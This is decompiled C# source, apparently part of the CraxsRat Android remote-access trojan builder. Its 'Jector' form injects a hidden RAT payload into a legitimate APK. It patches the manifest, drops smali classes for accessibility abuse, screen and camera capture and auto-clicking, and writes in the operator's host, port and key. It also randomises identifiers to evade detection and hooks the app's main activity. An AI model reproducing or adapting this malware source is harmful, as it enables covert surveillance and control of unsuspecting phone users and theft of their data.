										array3[k] = array3[k].Replace("<application", "<application android:requestLegacyExternalStorage=\"true\"");
									}
									array3[k] = array3[k] + Environment.NewLine + Module0.CypherMini.Replace("_ask_prim_", this.string_1).Replace("_access_ask_", this.string_2).Replace("EngineWorkerins", this.string_3).Replace("_srv_worker_", this.string_4).Replace("_cap_sc_", this.string_5).Replace("_update_app_", this.string_6).Replace("webviewer", this.string_13).Replace("SCRActivity", this.string_12).Replace("CamActivity", this.string_11).Replace("_ask_battary_", this.string_10).Replace("_scctrl_", this.string_14).Replace("ClassGen", this.string_8).Replace("_ask_draw_", this.string_9).Replace("WackMeUpJob", this.string_7);
									break;
								}
							}
							File.WriteAllLines(this.string_0 + "\\AndroidManifest.xml", array3);
							goto IL_760;
						}
					}
					goto IL_385;
				}
				catch (Exception ex2)
				{
					this.log.AppendText("Error Manifest :" + ex2.Message);
				}
				IL_760:
				string text3 = null;
				try
				{
					this.log.AppendText(Environment.NewLine + "Inject Data To Apk...");
					int num3 = 3;
					while (Directory.Exists(this.string_0 + "\\smali_classes" + num3.ToString()))
					{
						num3++;
						if (num3 > 16)
						{
							IL_807:
							if (text3 == null)
							{
								Directory.CreateDirectory(this.string_0 + "\\smali_classes2");
								Directory.CreateDirectory(this.string_0 + "\\smali_classes2\\ginom\\alfa\\lib\\scan");
								text3 = this.string_0 + "\\smali_classes2";
							}
							if (!File.Exists(text3 + "\\data.zip"))
							{
								File.WriteAllBytes(text3 + "\\data.zip", Module0.APPS);
							}
							ZipFile.ExtractToDirectory(text3 + "\\data.zip", text3);
							File.Delete(text3 + "\\data.zip");
							Thread.Sleep(1);
							if (!Directory.Exists(this.string_0 + "\\res\\xml"))
							{
								Directory.CreateDirectory(this.string_0 + "\\res\\xml");
							}
							File.WriteAllText(this.string_0 + "\\res\\xml\\accessibilityprivatesrcapp.xml", Module0.accessibilityprivatesrcapp);
							if (!Directory.Exists(this.string_0 + "\\res\\xml"))
							{
								Directory.CreateDirectory(this.string_0 + "\\res\\xml");
							}
							goto IL_949;
						}
					}
					Directory.CreateDirectory(this.string_0 + "\\smali_classes" + num3.ToString());
					Directory.CreateDirectory(this.string_0 + "\\smali_classes" + num3.ToString() + "\\ginom\\alfa\\lib\\scan");
					text3 = this.string_0 + "\\smali_classes" + num3.ToString();
					goto IL_807;
				}
				catch (Exception ex3)
				{
					this.log.AppendText("Error Data :" + ex3.Message);
				}
				IL_949:
				try
				{
					this.log.AppendText(Environment.NewLine + "Encryption...");
					string[] files = Directory.GetFiles(text3 + "\\ginom\\alfa\\lib\\scan");
					object value = 30;
					object value2 = 35;
					this.string_15 = Conversions.ToString(this.method_1(Conversions.ToInteger(value), Conversions.ToInteger(value2)));
					this.string_16 = Conversions.ToString(this.method_1(Conversions.ToInteger(value), Conversions.ToInteger(value2)));
					this.string_17 = Conversions.ToString(this.method_1(4, 4));
					this.string_18 = Conversions.ToString(this.method_1(4, 4));
					this.string_19 = Conversions.ToString(this.method_1(4, 4));
					this.string_20 = Conversions.ToString(this.method_1(4, 4));
					this.string_21 = Conversions.ToString(this.method_1(Conversions.ToInteger(value), Conversions.ToInteger(value2)));
					this.string_22 = Conversions.ToString(this.method_1(Conversions.ToInteger(value), Conversions.ToInteger(value2)));
					this.string_23 = Conversions.ToString(this.method_1(Conversions.ToInteger(value), Conversions.ToInteger(value2)));
					this.string_24 = Conversions.ToString(this.method_1(Conversions.ToInteger(value), Conversions.ToInteger(value2)));
					this.string_25 = Conversions.ToString(this.method_1(Conversions.ToInteger(value), Conversions.ToInteger(value2)));
					this.string_26 = Conversions.ToString(this.method_1(Conversions.ToInteger(value), Conversions.ToInteger(value2)));
					this.string_27 = Conversions.ToString(this.method_1(Conversions.ToInteger(value), Conversions.ToInteger(value2)));
					this.string_28 = Conversions.ToString(this.method_1(Conversions.ToInteger(value), Conversions.ToInteger(value2)));
					this.string_29 = Conversions.ToString(this.method_1(Conversions.ToInteger(value), Conversions.ToInteger(value2)));
					this.string_30 = Conversions.ToString(this.method_1(Conversions.ToInteger(value), Conversions.ToInteger(value2)));
					this.string_31 = Conversions.ToString(this.method_1(Conversions.ToInteger(value), Conversions.ToInteger(value2)));
					this.string_32 = Conversions.ToString(this.method_1(Conversions.ToInteger(value), Conversions.ToInteger(value2)));
					this.string_34 = Conversions.ToString(this.method_1(Conversions.ToInteger(value), Conversions.ToInteger(value2)));
					this.string_35 = this.method_8();
					this.string_33 = "QsdvgaerEARGar";
					foreach (string path in files)
					{
						string contents = File.ReadAllText(path).Replace("_ask_prim_", this.string_1).Replace("_access_ask_", this.string_2).Replace("EngineWorkerins", this.string_3).Replace("_srv_worker_", this.string_4).Replace("_cap_sc_", this.string_5).Replace("_update_app_", this.string_6).Replace("webviewer", this.string_13).Replace("SCRActivity", this.string_12).Replace("CamActivity", this.string_11).Replace("_ask_battary_", this.string_10).Replace("_scctrl_", this.string_14).Replace("ClassGen", this.string_8).Replace("_METHOD_getbyte_", this.string_15).Replace("_mthd_issrvrun_", this.string_16).Replace("_splet_1_", this.string_17).Replace("_split_2_", this.string_18).Replace("_split_3_", this.string_19).Replace("_the_plugns_", this.string_34).Replace("_split_4_", this.string_20).Replace("_the_host_", this.string_21).Replace(this.method_7("fhTUPYsif35OSfhZ0W7kaw==", this.string_36), Convert.ToBase64String(Encoding.UTF8.GetBytes(this.TheKey.Text))).Replace(this.method_7("l47cEy4tX1IFMbXx/K/EjQ==", this.string_36), Convert.ToBase64String(Encoding.UTF8.GetBytes(this.Host.Text))).Replace(this.method_7("4v6Ulzh5+UOGfKCrVSMVZQ==", this.string_36), Convert.ToBase64String(Encoding.UTF8.GetBytes(this.Port.Text))).Replace(Conversions.ToString(Module2.smethod_11("hajv4qNfq5d4d25jN/QMWQ==")), this.checksuper.Checked.ToString()).Replace(Conversions.ToString(Module2.smethod_11("G5YY62OUDWk0QXE/ib1LGQ==")), this.checkkill.Checked.ToString()).Replace(Conversions.ToString(Module2.smethod_11("kIXrV3titSwifjGOHvWxBw==")), this.checkDraw.Checked.ToString()).Replace(Conversions.ToString(Module2.smethod_11("qovn9dktIM/p6MRESsnNKQ==")), this.checkautoclick.Checked.ToString()).Replace(Conversions.ToString(Module2.smethod_11("XmVh1sCpTme80V3/IaUM6A==")), this.object_6.ToString()).Replace("fource.info", "false").Replace("name.info", this.CLiname.Text).Replace("_the_port_", this.string_22).Replace("_the_key_", this.string_23).Replace("_the_alive_", this.string_24).Replace("_usr_nam_", this.string_25).Replace("_the_eco_", this.string_26).Replace("_C_N_L_", this.string_30).Replace("_c_N_M_", this.string_31).Replace("_NOTIFI_TITLE_", this.titletext.Text).Replace("_NOTIFI_MSG_", this.msgtext.Text).Replace("_send_mthd_", this.string_32).Replace("_the_fouce_", this.string_32).Replace("_the_fouce_", this.string_33).Replace("_the_sokt_", this.string_28).Replace("payload", Conversions.ToString(this.method_1(Conversions.ToInteger(value), Conversions.ToInteger(value2)))).Replace("_start_connect_", this.string_29).Replace("_is_connected_", this.string_27).Replace("[RANDOM-STRING]", this.string_35).Replace("_ask_draw_", this.string_9).Replace("WackMeUpJob", this.string_7);
						File.WriteAllText(path, contents);
						Thread.Sleep(1);
					}
					string text4 = text3 + "\\ginom\\alfa\\lib\\scan";
					string searchPattern = "*.smali";
					int num4 = 0;
					foreach (string text5 in Directory.GetFiles(text4, searchPattern, SearchOption.AllDirectories))
					{
						if (text5.Contains("_ask_prim_") | text5.Equals("_ask_prim_"))
						{
							File.Move(Path.Combine(text4, text5), Path.Combine(text4, text5.Replace("_ask_prim_", this.string_1)));
						}
						if (text5.Contains("EngineWorkerins") | text5.Equals("EngineWorkerins"))
						{
							File.Move(Path.Combine(text4, text5), Path.Combine(text4, text5.Replace("EngineWorkerins", this.string_3)));
						}
						if (text5.Contains("_access_ask_") | text5.Equals("_access_ask_"))
						{
							File.Move(Path.Combine(text4, text5), Path.Combine(text4, text5.Replace("_access_ask_", this.string_2)));
						}
						if (text5.Contains("_srv_worker_") | text5.Equals("_srv_worker_"))
						{
							File.Move(Path.Combine(text4, text5), Path.Combine(text4, text5.Replace("_srv_worker_", this.string_4)));
						}
						if (text5.Contains("_cap_sc_") | text5.Equals("_cap_sc_"))
						{
							File.Move(Path.Combine(text4, text5), Path.Combine(text4, text5.Replace("_cap_sc_", this.string_5)));
						}
						if (text5.Contains("_ask_battary_") | text5.Equals("_ask_battary_"))
						{
							File.Move(Path.Combine(text4, text5), Path.Combine(text4, text5.Replace("_ask_battary_", this.string_10)));
						}
						if (text5.Contains("_update_app_") | text5.Equals("_update_app_"))
						{
							File.Move(Path.Combine(text4, text5), Path.Combine(text4, text5.Replace("_update_app_", this.string_6)));
						}
						if (text5.Contains("SCRActivity") | text5.Equals("SCRActivity"))
						{
							File.Move(Path.Combine(text4, text5), Path.Combine(text4, text5.Replace("SCRActivity", this.string_12)));
						}
						if (text5.Contains("webviewer") | text5.Equals("webviewer"))
						{
							File.Move(Path.Combine(text4, text5), Path.Combine(text4, text5.Replace("webviewer", this.string_13)));
						}
						if (text5.Contains("CamActivity") | text5.Equals("CamActivity"))
						{
							File.Move(Path.Combine(text4, text5), Path.Combine(text4, text5.Replace("CamActivity", this.string_11)));
						}
						if (text5.Contains("_scctrl_") | text5.Equals("_scctrl_"))
						{
							File.Move(Path.Combine(text4, text5), Path.Combine(text4, text5.Replace("_scctrl_", this.string_14)));
						}
						if (text5.Contains("ClassGen"))
						{
							File.Move(Path.Combine(text4, text5), Path.Combine(text4, text5.Replace("ClassGen", this.string_8)));
						}
						if (text5.Contains("WackMeUpJob") | text5.Equals("WackMeUpJob"))
						{
							File.Move(Path.Combine(text4, text5), Path.Combine(text4, text5.Replace("WackMeUpJob", this.string_7)));
						}
						if (text5.Contains("_ask_draw_") | text5.Equals("_ask_draw_"))
						{
							File.Move(Path.Combine(text4, text5), Path.Combine(text4, text5.Replace("_ask_draw_", this.string_9)));
						}
						num4++;
						Thread.Sleep(1);
					}
				}
				catch (Exception ex4)
				{
					this.log.AppendText(Environment.NewLine + "Error : Encryption...\r\n" + ex4.Message);
				}
				this.log.AppendText(Environment.NewLine + "Injecting Main Activity...");
				int num5 = 0;
				try
				{
					IEnumerator enumerator2 = this.Activlist.Items.GetEnumerator();
					while (enumerator2.MoveNext())
					{
						string text6 = Conversions.ToString(enumerator2.Current);
						try
						{
							text6 = text6.Replace(">", this.string_0);
							if (File.Exists(text6))
							{
								string[] array6 = File.ReadAllLines(text6);
								int num6 = array6.Length;
								for (int n = 0; n <= num6; n++)
								{
									string newValue;
									if (n == 0)
									{
										string[] array7 = array6[0].Split(new char[]
										{
											' '
										});
										newValue = array7[array7.Length - 1];
									}
									if (array6[n].Contains(this.method_7("XqgovOgiwNmuEisbFkaXwA==", this.string_36)) && array6[n].ToLower().StartsWith(".method".ToLower()))
									{
										array6[n + 1] = array6[n + 1] + Environment.NewLine + this.method_4(Module0.oncreatecode).Replace(this.method_4("W3RyZ3RtYWluXQ=="), newValue);
										array6[array6.Length - 1] = array6[array6.Length - 1] + Environment.NewLine + Environment.NewLine + this.method_4(this.method_7(Module0.MainMith, this.string_36)).Replace(this.method_4("W3RyZ3RtYWluXQ=="), newValue).Replace("MainReflectorScan", this.string_8 + "9");
										IL_1595:
										File.WriteAllLines(text6, array6);
										goto IL_159E;
									}
								}
								goto IL_1595;
							}
							IL_159E:;
						}
						catch (Exception ex5)
						{
						}
						num5++;
					}
				}
				finally
				{
					IEnumerator enumerator2;
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
				this.log.AppendText(Environment.NewLine + "-----------------" + Environment.NewLine + "All Done Recompile Apk...");
			}
		}

		// Token: 0x06000DAB RID: 3499 RVA: 0x00019AD4 File Offset: 0x00017CD4
		public string method_7(string string_0, string string_1)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] array = new byte[32];
			byte[] sourceArray = md5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(string_1));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(string_0);
			return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
		}

		// Token: 0x06000DAC RID: 3500 RVA: 0x00090C54 File Offset: 0x0008EE54
		public string method_8()
		{
			return Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(this.method_1(400, 1000), "\u0085\u0085\\n\u0085\u0085\u0085\u0085\u0085\\n\u0085\u0085\u0085"), this.method_9(400, 1000)), "\u0085\u0085\\n\u0085\u0085\u0085\u0085\u0085\\n\u0085\u0085\u0085"), this.method_1(400, 1000)), "\u0085\u0085\\n\u0085\u0085\u0085\u0085\u0085\\n\u0085\u0085\u0085"), this.method_9(400, 1000)));
		}

		// Token: 0x06000DAD RID: 3501 RVA: 0x00090CD8 File Offset: 0x0008EED8
		public object method_9(int int_4, int int_5)
		{
			string text = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP";
			if (this.random_0 == null)
			{
				this.random_0 = new Random();
			}
			string text2 = "";
			checked
			{
				while (text2.Length < int_4)
				{
					text2 += Conversions.ToString(text[this.random_0.Next(0, text.Length - 1)]);
				}
				ref int ptr = ref this.int_1;
				this.int_1 = ptr + 1;
				return text2.ToString().ToLower() + Conversions.ToString(this.int_1);
			}
		}

		// Token: 0x06000DAE RID: 3502 RVA: 0x00090D6C File Offset: 0x0008EF6C
		public object method_10(int int_4, int int_5)
		{
			string text = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP";
			if (this.staticLocalInitFlag_2 == null)
			{
				Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.staticLocalInitFlag_2, new StaticLocalInitFlag(), null);
			}
			bool flag = false;
			try
			{
				Monitor.Enter(this.staticLocalInitFlag_2, ref flag);
				if (this.staticLocalInitFlag_2.State == 0)
				{
					this.staticLocalInitFlag_2.State = 2;
					this.random_3 = new Random();
				}
				else if (this.staticLocalInitFlag_2.State == 2)
				{
					throw new IncompleteInitialization();
				}
			}
			finally
			{
				this.staticLocalInitFlag_2.State = 1;
				if (flag)
				{
					Monitor.Exit(this.staticLocalInitFlag_2);
				}
			}
			int num = this.random_3.Next(int_4, int_5);
			StringBuilder stringBuilder = new StringBuilder();
			int num2 = num;
			checked
			{
				for (int i = 1; i <= num2; i++)
				{
					int startIndex = this.random_3.Next(0, text.Length);
					stringBuilder.Append(text.Substring(startIndex, 1));
				}
				return stringBuilder.ToString();
			}
		}

		// Token: 0x06000DAF RID: 3503 RVA: 0x00090E68 File Offset: 0x0008F068
		private bool method_11()
		{
			return this.Host.Text != "" && this.Port.Text != "" && this.TheKey.Text != "" && this.FolderPath.Text != "" && this.Activlist.Items.Count > 0;
		}

		// Token: 0x06000DB0 RID: 3504 RVA: 0x00090EF0 File Offset: 0x0008F0F0
		private void method_12(object sender, EventArgs e)
		{
			try
			{
				if (Operators.CompareString(this.Port.Text, "", false) != 0 && !Versioned.IsNumeric(this.Port.Text))
				{
					this.Port.Text = "";
					Interaction.MsgBox("Only Numbers", MsgBoxStyle.OkOnly, null);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x1700040B RID: 1035
		// (get) Token: 0x06000DB1 RID: 3505 RVA: 0x00090F6C File Offset: 0x0008F16C
		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = base.CreateParams;
				createParams.ExStyle |= 128;
				return createParams;
			}
		}

		// Token: 0x06000DB2 RID: 3506 RVA: 0x00090F98 File Offset: 0x0008F198
		private void Jector_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				MySettingsProperty.Settings.inj_tnam = this.CLiname.Text;
				MySettingsProperty.Settings.inj_thost = this.Host.Text;
				MySettingsProperty.Settings.inj_tport = this.Port.Text;
				MySettingsProperty.Settings.inj_tkey = this.TheKey.Text;
				MySettingsProperty.Settings.Save();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000DB3 RID: 3507 RVA: 0x00091024 File Offset: 0x0008F224
		private void Jector_Load(object sender, EventArgs e)
		{
			this.method_0();
			try
			{
				this.CLiname.Text = MySettingsProperty.Settings.inj_tnam;
				this.Host.Text = MySettingsProperty.Settings.inj_thost;
				this.Port.Text = MySettingsProperty.Settings.inj_tport;
				this.TheKey.Text = MySettingsProperty.Settings.inj_tkey;
			}
			catch (Exception ex)
			{
				this.CLiname.Text = "Client1";
				this.Host.Text = "...";
				this.Port.Text = "7771";
				this.TheKey.Text = "TxTxT";
			}
		}

		// Token: 0x06000DB4 RID: 3508 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_15(object sender, EventArgs e)
		{
		}

		// Token: 0x06000DB5 RID: 3509 RVA: 0x00011540 File Offset: 0x0000F740
		private void method_16(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000DB6 RID: 3510
		[DllImport("user32")]
		public static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x06000DB7 RID: 3511
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x06000DB8 RID: 3512 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_17(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000DB9 RID: 3513 RVA: 0x000910EC File Offset: 0x0008F2EC
		private void DrakeUITitlePanel2_Click(object sender, EventArgs e)
		{
			try
			{
				Process.Start("https://CraxsRat.net/");
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000DBA RID: 3514 RVA: 0x00091128 File Offset: 0x0008F328
		private void Panel3_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Jector.ReleaseCapture();
				Jector.SendMessage(base.Handle, Jector.int_2, Jector.int_3, 0);
			}
		}

		// Token: 0x06000DBB RID: 3515 RVA: 0x00091164 File Offset: 0x0008F364
		private void removeactiv_Click(object sender, EventArgs e)
		{
			if (this.Activlist.Items.Count <= 0)
			{
				Alert.ShowInformation("Activity List: 0");
			}
			else if (this.Activlist.SelectedItem != null)
			{
				this.Activlist.Items.Remove(RuntimeHelpers.GetObjectValue(this.Activlist.SelectedItem));
			}
			else
			{
				Alert.ShowInformation("Select Activity First");
			}
		}

		// Token: 0x0400076D RID: 1901
		private string string_0;

		// Token: 0x0400076E RID: 1902
		private string string_1;

		// Token: 0x0400076F RID: 1903
		private string string_2;

		// Token: 0x04000770 RID: 1904
		private string string_3;

		// Token: 0x04000771 RID: 1905
		private string string_4;

		// Token: 0x04000772 RID: 1906
		private string string_5;

		// Token: 0x04000773 RID: 1907
		private string string_6;

		// Token: 0x04000774 RID: 1908
		private string string_7;

		// Token: 0x04000775 RID: 1909
		private string string_8;

		// Token: 0x04000776 RID: 1910
		private string string_9;

		// Token: 0x04000777 RID: 1911
		private string string_10;

		// Token: 0x04000778 RID: 1912
		private string string_11;

		// Token: 0x04000779 RID: 1913
		private string string_12;

		// Token: 0x0400077A RID: 1914
		private string string_13;

		// Token: 0x0400077B RID: 1915
		private string string_14;

		// Token: 0x0400077C RID: 1916
		private string string_15;

		// Token: 0x0400077D RID: 1917
		private string string_16;

		// Token: 0x0400077E RID: 1918
		private string string_17;

		// Token: 0x0400077F RID: 1919
		private string string_18;

		// Token: 0x04000780 RID: 1920
		private string string_19;

		// Token: 0x04000781 RID: 1921
		private string string_20;

		// Token: 0x04000782 RID: 1922
		private string string_21;

		// Token: 0x04000783 RID: 1923
		private string string_22;

		// Token: 0x04000784 RID: 1924
		private string string_23;

		// Token: 0x04000785 RID: 1925
		private string string_24;

		// Token: 0x04000786 RID: 1926
		private string string_25;

		// Token: 0x04000787 RID: 1927
		private string string_26;

		// Token: 0x04000788 RID: 1928
		private string string_27;

		// Token: 0x04000789 RID: 1929
		private string string_28;

		// Token: 0x0400078A RID: 1930
		private string string_29;

		// Token: 0x0400078B RID: 1931
		private string string_30;

		// Token: 0x0400078C RID: 1932
		private string string_31;

		// Token: 0x0400078D RID: 1933
		private string string_32;

		// Token: 0x0400078E RID: 1934
		private string string_33;

		// Token: 0x0400078F RID: 1935
		private string string_34;

		// Token: 0x04000790 RID: 1936
		private string string_35;

		// Token: 0x04000791 RID: 1937
		private List<string> strings_0;

		// Token: 0x04000792 RID: 1938
		private int int_0;

		// Token: 0x04000793 RID: 1939
		public string string_36;

		// Token: 0x04000794 RID: 1940
		public object object_0;

		// Token: 0x04000795 RID: 1941
		public object object_1;

		// Token: 0x04000796 RID: 1942
		public object object_2;

		// Token: 0x04000797 RID: 1943
		public object object_3;

		// Token: 0x04000798 RID: 1944
		public object object_4;

		// Token: 0x04000799 RID: 1945
		public object object_5;

		// Token: 0x0400079A RID: 1946
		public object object_6;

		// Token: 0x0400079B RID: 1947
		public Random random_0;

		// Token: 0x0400079C RID: 1948
		public int int_1;

		// Token: 0x0400079D RID: 1949
		public static int int_2 = 161;

		// Token: 0x0400079E RID: 1950
		public static int int_3 = 2;

		// Token: 0x0400079F RID: 1951
		private Random random_1;

		// Token: 0x040007A0 RID: 1952
		private StaticLocalInitFlag staticLocalInitFlag_0;

		// Token: 0x040007A1 RID: 1953
		private Random random_2;

		// Token: 0x040007A2 RID: 1954
		private StaticLocalInitFlag staticLocalInitFlag_1;

		// Token: 0x040007A3 RID: 1955
		private Random random_3;

		// Token: 0x040007A4 RID: 1956
		private StaticLocalInitFlag staticLocalInitFlag_2;
	}
}
